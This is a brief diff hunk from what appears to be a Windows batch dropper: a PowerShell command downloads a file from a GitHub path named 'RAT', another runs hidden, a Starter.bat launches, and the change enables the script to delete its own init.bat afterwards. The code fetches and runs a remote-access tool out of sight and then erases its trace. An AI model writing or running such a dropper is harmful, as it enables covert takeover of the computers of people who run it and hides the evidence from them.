@@ -8,4 +8,4 @@ powershell powershell.exe "curl https://raw.githubusercontent.com/saifnasef/RAT/
 powershell powershell.exe -windowstyle hidden timeout 5
 powershell ./Starter.bat
 cd %currentd%
-rem del init.bat
+del init.bat
